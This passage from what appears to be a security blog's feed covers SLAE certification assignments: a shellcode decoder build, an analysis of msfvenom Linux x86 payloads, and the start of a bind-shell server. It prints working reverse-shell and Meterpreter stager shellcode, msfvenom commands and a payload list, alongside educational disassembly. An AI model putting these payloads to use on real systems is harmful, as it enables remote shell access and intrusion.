&lt;p&gt;In order to be able to modify the encrypted shellcode (ie to substitute its bytes for the decrypted ones) we must remember it is located in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section which is not writable by default.&lt;/p&gt;

&lt;p&gt;Lets assemble and link our decoder:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -f elf32 decoder.asm -o decoder.o ; ld -m elf_i386 decoder.o -o decoder
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we check sessions permissions using &lt;code class=&quot;highlighter-rouge&quot;&gt;readelf&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf -S decoder
There are 5 section headers, starting at offset 0x1fc:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        08048060 000060 00004a 00  AX  0   0 16
  [ 2] .symtab           SYMTAB          00000000 0000ac 0000d0 10      3   9  4
  [ 3] .strtab           STRTAB          00000000 00017c 00005d 00      0   0  1
  [ 4] .shstrtab         STRTAB          00000000 0001d9 000021 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Just confirming where our string is:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d decoder | grep EncodedShellcode
...
08048091 &amp;lt;EncodedShellcode&amp;gt;:
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So yeah, in &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section, which is not Writable. To make it writable we need to link it with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-N&lt;/code&gt; parameter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       -N
       --omagic
           Set the text and data sections to be readable and writable.  Also, do not page-align the data segment, and disable linking against
           shared libraries.  If the output format supports Unix style magic numbers, mark the output as &quot;OMAGIC&quot;. Note: Although a writable
           text section is allowed for PE-COFF targets, it does not conform to the format specification published by Microsoft.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Therefore:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -f elf32 decoder.asm -o decoder.o ; ld -N -m elf_i386 decoder.o -o decoder
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checking permissions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf -S decoder
There are 5 section headers, starting at offset 0x1fc:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        08048060 000060 00004a 00 WAX  0   0 16
  [ 2] .symtab           SYMTAB          00000000 0000ac 0000d0 10      3   9  4
  [ 3] .strtab           STRTAB          00000000 00017c 00005d 00      0   0  1
  [ 4] .shstrtab         STRTAB          00000000 0001d9 000021 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There we go, writable &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section!. Executing it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./decoder 
$ whoami
valle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
				<pubDate>Sun, 02 Sep 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/09/02/odd-even-encoder.html</link>
				<guid isPermaLink="true">/re/exploit/2018/09/02/odd-even-encoder.html</guid>
			</item>
		
			<item>
				<title>Assignment 5 - Msfvenom shellcodes analysis</title>
				<description>&lt;h1 id=&quot;assignment-5&quot;&gt;Assignment #5&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1228&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;libemu-and-friends&quot;&gt;Libemu and friends&lt;/h2&gt;
&lt;p&gt;For this task I used &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;msfpayload&lt;/code&gt;, since this is the current standard tool to generate shellcodes. I also used &lt;code class=&quot;highlighter-rouge&quot;&gt;sctest&lt;/code&gt;, a tool that is part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;libemu&lt;/code&gt; testsuite, just like in the videos. This package is available in Debian Stretch as &lt;code class=&quot;highlighter-rouge&quot;&gt;libemu2&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# apt install libemu2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets learn a little more about &lt;code class=&quot;highlighter-rouge&quot;&gt;libemu&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;libemu is a small library written in c offering basic x86 emulation and shellcode detection using GetPC heuristics.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And what on earth is GetPC? &lt;a href=&quot;https://nets.ec/Shellcode/Environment#GetPc&quot;&gt;This&lt;/a&gt; page by NetSec will tell you:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The GetPc technique is implementation of code which obtains the current instruction pointer. This can be useful when writing self-modifying shellcode, or other code that must become aware of its environment, as environment information cannot be supplied prior to execution of the code. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In short, it is an elegant way to get the address pointed by EIP, which is not directly accessible in x86.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jmp startup
getpc:
   mov (%esp), %eax
   ret
startup:
call getpc       ; the %eax register now contains %eip on the next line 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, enough of learning about &lt;code class=&quot;highlighter-rouge&quot;&gt;libemu&lt;/code&gt; internals. Moving on to &lt;code class=&quot;highlighter-rouge&quot;&gt;sctest&lt;/code&gt;, this is a tool that allows, among other things, to generate a control flow graph for the shellcode and write it to a DOT file. This file can be rendered as an image using the &lt;code class=&quot;highlighter-rouge&quot;&gt;dot&lt;/code&gt; utility.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sctest allows to test streams for shellcode.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based on the course videos and on [this] page I managed to create a one liner that generates an image of the shellcode flow.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat shellcode.hex | tr -d '\\\x' | xxd -r -p | sctest -vvv -Ss 99999 -G shellcode.dot; dot -Tpng -o shellcode.png shellcode.dot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;selected-shellcodes&quot;&gt;Selected shellcodes&lt;/h2&gt;
&lt;p&gt;Before picking 3 shellcodes to analyse I took a look at the payloads for &lt;code class=&quot;highlighter-rouge&quot;&gt;linux/x86&lt;/code&gt; Metasploit has to offer:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom --list payloads | grep linux/x86
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                           Spawn a shell on an established connection
    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I decided to analyse the following payloads.&lt;/p&gt;

&lt;h3 id=&quot;linuxx86exec-cmdbinbash&quot;&gt;linux/x86/exec CMD=”/bin/bash”&lt;/h3&gt;
&lt;p&gt;I used this one during &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/08/23/egg-hunter.html&quot;&gt;Assignment#3&lt;/a&gt; for spawning a shell after a buffer overflow using an egg hunter. Now it is time to understand what has happened under the hood.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/bash&quot; -f c
No encoder or badchars specified, outputting raw payload
Payload size: 45 bytes
Final size of c file: 213 bytes
unsigned char buf[] = 
&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&quot;
&quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f&quot;
&quot;\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is a very simple shellcode, basically the stack is prepared and the syscall is called. However, there is on particularly interesting optimization here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;cwd&lt;/code&gt; instruction to clear out edx. The sign of eax (0 in this case) is copied into dx, therefore clearing it out.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Line-by-line analysis:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push   0xb 
pop    eax  ;the first 2 lines set eax=0xb, which is the syscall number for sys_execve
cwd         ;clears edx
push   edx  ;pushes 0 into the stack
pushw  0x632d   ;pushes '-c' into the stack
mov    edi,esp  ;save the stack pointer in edi (points to -c)
push   0x68732f ;save /sh into the stack (little endian)
push   0x6e69622f   ;save /bin into the stack (little endian)
mov    ebx,esp  ;save the stack pointer in ebx (points to /bin/sh)
push   edx  ;push 0 into the stack      
call   0xf  ;probably related to stack alignment, not sure
push   edi  ;push -c again
push   ebx  ;push /bin/sh
mov    ecx,esp  ;save '/bin/sh -c' in ecx
;EAX=0xb
;EBX -&amp;gt; &quot;/bin/sh&quot;
;ECX -&amp;gt; Address of '/bin/sh -c'
;EDX -&amp;gt;
int    0x80; calls execve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/exec.png&quot; alt=&quot;exec&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a bonus, lets see what happens when we try to avoid NULLs.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/bash&quot; -b '\x00' -f c
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of c file: 327 bytes
unsigned char buf[] = 
&quot;\xbf\xd1\xf0\xac\xf4\xdb\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1&quot;
&quot;\x0c\x83\xea\xfc\x31\x7a\x0f\x03\x7a\xde\x12\x59\x9e\xeb\x8a&quot;
&quot;\x3b\x0d\x8d\x42\x11\xd1\xd8\x74\x01\x3a\xa9\x12\xd2\x2c\x62&quot;
&quot;\x81\xbb\xc2\xf5\xa6\x6e\xf3\x0f\x29\x8f\x03\x20\x4b\xe6\x6d&quot;
&quot;\x11\xe9\x99\x02\x05\xed\x0e\xb6\x5c\x0c\x7d\xb8&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/exec_no_null.png&quot; alt=&quot;exec_no_nulls&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wow, not exactly what I was expecting. But looking the output more carefully:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In order to avoid NULL bytes, msfvenom picks an encoder. In this case the infamous &lt;code class=&quot;highlighter-rouge&quot;&gt;shikata_ga_nai&lt;/code&gt;. So I decided do my homework and check how this encoder works. Despite its frequent use, I could not find so many sources explaining the algorithm. But to not turn this post into a book I made another one dedicated to this subject.&lt;/p&gt;

&lt;p&gt;You can find &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html&quot;&gt;my shikata_ga_nai analysis here&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;linuxx86shell_reverse_tcp&quot;&gt;linux/x86/shell_reverse_tcp&lt;/h3&gt;
&lt;p&gt;I have also used the reverse_tcp shellcode when preparing &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/08/20/reverse-shell-tcp.html&quot;&gt;Assignment#2&lt;/a&gt; and was actually wondering how it works.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;
&quot;\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68&quot;
&quot;\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1&quot;
&quot;\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3&quot;
&quot;\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/shell_reverse_tcp.png&quot; alt=&quot;shell_reverse_tcp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you remember from our previous assignment, we used the following functions that were later converted to syscalls:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;int socket(int protocolFamily, int type, int protocol);&lt;/li&gt;
  &lt;li&gt;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength);&lt;/li&gt;
  &lt;li&gt;int dup2(int oldfd, int newfd);&lt;/li&gt;
  &lt;li&gt;int execve(const char *filename, char *const argv[],char *const envp[]);&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;They are all there. There are some differences between our simple shellcode and this elegant one. First, there are several optimizations, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;mul&lt;/code&gt; instruction to clear registers&lt;/li&gt;
  &lt;li&gt;Usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;xchg&lt;/code&gt; instruction to move the content of one register to another&lt;/li&gt;
  &lt;li&gt;Usage of a loop structure for redirecting INPUT, OUTPUT and ERROR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Improvements apart, the essence of this shellcode is pretty much the same as ours.&lt;/p&gt;

&lt;h3 id=&quot;linuxx86meterpreterreverse_tcp&quot;&gt;linux/x86/meterpreter/reverse_tcp&lt;/h3&gt;
&lt;p&gt;Now that we know what &lt;code class=&quot;highlighter-rouge&quot;&gt;linux/x86/shell_reverse_tcp&lt;/code&gt;, why not looking at Meterpreter? Metasploit splits some of it payloads in Stageless and Staged categories. The first one corresponds to payloads that are delivered as a single chunk and you can identify them as &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter_&lt;/code&gt;. On the other hand, Staged payloads are delivered in parts. Initially the victim receives a small stage which then loads the following stages.&lt;/p&gt;

&lt;p&gt;Since the stageless payload is humongous, I will analyse only the stalegess version.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] = 
&quot;\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89&quot;
&quot;\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c&quot;
&quot;\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0&quot;
&quot;\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05&quot;
&quot;\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9&quot;
&quot;\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd&quot;
&quot;\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80&quot;
&quot;\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00&quot;
&quot;\x00\xcd\x80&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Code analysis (highlights):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:  6a 0a                   push   0xa
2:  5e                      pop    esi	;esi=0xa (PUSH-POP technique)
3:  31 db                   xor    ebx,ebx	;clear out ebx
5:  f7 e3                   mul    ebx	;clear eax
7:  53                      push   ebx	;store 0 on the stack
8:  43                      inc    ebx	;ebx=1
9:  53                      push   ebx	;store 1 on the stack
a:  6a 02                   push   0x2	;store 2 on the stack
c:  b0 66                   mov    al,0x66	;socketcall syscall number 0x66 in eax
e:  89 e1                   mov    ecx,esp	;point ecx to the parameters on the stack
;EAX=0x66 (socketcall)
;EBX=1 (socket)
;ECX -&amp;gt; 2/1/0 (parameters)

10: cd 80                   int    0x80		;call syscall (socket)
12: 97                      xchg   edi,eax  ;save the result of the syscall (file descriptor) in edi
13: 5b                      pop    ebx      ;ebx=2
14: 68 7f 00 00 01          push   0x100007f    ;IP
19: 68 02 00 11 5c          push   0x5c110002   ;PORT
1e: 89 e1                   mov    ecx,esp  ;ecx points to the parameters on the stack
20: 6a 66                   push   0x66
22: 58                      pop    eax      ;eax=0x66, 'connect' syscall number
23: 50                      push   eax      ;push 0x66 on the stack (socketcall)
24: 51                      push   ecx      ;push the address of the parameters
25: 57                      push   edi      ;push the socket file descriptor
26: 89 e1                   mov    ecx,esp  ;ecx now points to the parameters on the stack
28: 43                      inc    ebx      ;ebx=3
;EAX=0x66 (socketcall)
;EBX=3 (connect)
;ECX -&amp;gt; &amp;amp;(sockaddr parameters)


29: cd 80                   int    0x80 ;call syscall (connect)
2b: 85 c0                   test   eax,eax  ;check if eax is 0 (connection successful)
2d: 79 19                   jns    0x48
2f: 4e                      dec    esi  ;if connection failed,
30: 74 3d                   je     0x6f
32: 68 a2 00 00 00          push   0xa2 ;prepare nanosleep syscall
37: 58                      pop    eax
38: 6a 00                   push   0x0
3a: 6a 05                   push   0x5
3c: 89 e3                   mov    ebx,esp
3e: 31 c9                   xor    ecx,ecx
40: cd 80                   int    0x80 ;call nanosleep (wait for signal)
42: 85 c0                   test   eax,eax
44: 79 bd                   jns    0x3
46: eb 27                   jmp    0x6f
48: b2 07                   mov    dl,0x7
4a: b9 00 10 00 00          mov    ecx,0x1000
4f: 89 e3                   mov    ebx,esp
51: c1 eb 0c                shr    ebx,0xc
54: c1 e3 0c                shl    ebx,0xc
57: b0 7d                   mov    al,0x7d
59: cd 80                   int    0x80
5b: 85 c0                   test   eax,eax
5d: 78 10                   js     0x6f
5f: 5b                      pop    ebx
60: 89 e1                   mov    ecx,esp
62: 99                      cdq
63: b6 0c                   mov    dh,0xc
65: b0 03                   mov    al,0x3
67: cd 80                   int    0x80 ;read syscall
69: 85 c0                   test   eax,eax
6b: 78 02                   js     0x6f
6d: ff e1                   jmp    ecx
6f: b8 01 00 00 00          mov    eax,0x1
74: bb 01 00 00 00          mov    ebx,0x1
79: cd 80                   int    0x80 ;sys_exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The idea is to create a socket then try to connect to a certain IP/PORT. If it does not succed, wait for a few seconds or the delivery of a signal (connection). If the time runs off, goes back to the beginning and try to connect once again. When if finally succeds, read whatever is sent (probably the next stage).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/meterpreter_reverse_tcp_staged.png&quot; alt=&quot;meterpreter/reverse_tcp&quot; /&gt;&lt;/p&gt;
</description>
				<pubDate>Sun, 02 Sep 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/09/02/msfvenom-shellcode-analysis.html</link>
				<guid isPermaLink="true">/re/exploit/2018/09/02/msfvenom-shellcode-analysis.html</guid>
			</item>
		
			<item>
				<title>Assignment 1 - Bind Shell TCP</title>
				<description>&lt;h1 id=&quot;assignment-1&quot;&gt;Assignment #1&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1228&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since I first accomplished Assignment 2 (Reverse Shell TCP) instead of Assignment 1, all the networking and programming related topics had already been reviewd.&lt;/p&gt;

&lt;p&gt;Indeed, both assignments are very simmilar. Most of the differences are concerned to the envolved functions. While in a Reverse Shell we basically built a TCP client socket, in a Bind Shell we will work on something like a server.&lt;/p&gt;

&lt;h2 id=&quot;listen&quot;&gt;listen()&lt;/h2&gt;
&lt;p&gt;After creating the socket and binding it to a port, we will now have it listening instead of actively connecting.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int listen(int socket, int queueLimit)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we are expecting a single connection, our queueLimit is 0.&lt;/p&gt;

&lt;h2 id=&quot;accept&quot;&gt;accept()&lt;/h2&gt;
&lt;p&gt;Once the socket is listening, we now wait for new connections. It is common to have this function inside an infinite loop, so the socket can handle multiple connections.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int accept(int socket, struct sockaddr *clientAddress, unsigned int *addressLength)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Although this is not the case here, it should be noticed the function will return a new file descriptor to our single connection. Just like when we created the socket, we will have to save it in a stable register so we can use it later in our dup2 function.&lt;/p&gt;

&lt;h2 id=&quot;dup2-and-execve&quot;&gt;dup2() and execve()&lt;/h2&gt;
&lt;p&gt;When someone connects to this socket and it is accepted we are able to redirect INPUT, OUTPUT and ERROR to the new client socket and finally pop a shell with execve. This is very simmilar to what we did in Assignment 2, so I will skip it.&lt;/p&gt;

&lt;h2 id=&quot;working-tcp-server&quot;&gt;Working TCP server&lt;/h2&gt;
&lt;p&gt;In order to create the simplest client possible, we cut all the error corrections. This is for &lt;strong&gt;educational purposes only&lt;/strong&gt; and should NEVER be used in production.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; #include&amp;lt;stdio.h&amp;gt; //printf
 #include&amp;lt;string.h&amp;gt;    //strlen
 #include&amp;lt;sys/socket.h&amp;gt;    //socket
 #include&amp;lt;arpa/inet.h&amp;gt; //inet_addr
 
 int main(int argc , char *argv[]){
 
     int sock;
     int clntSock;
     struct sockaddr_in server;
     struct sockaddr_in client;
 
     server.sin_addr.s_addr = INADDR_ANY;
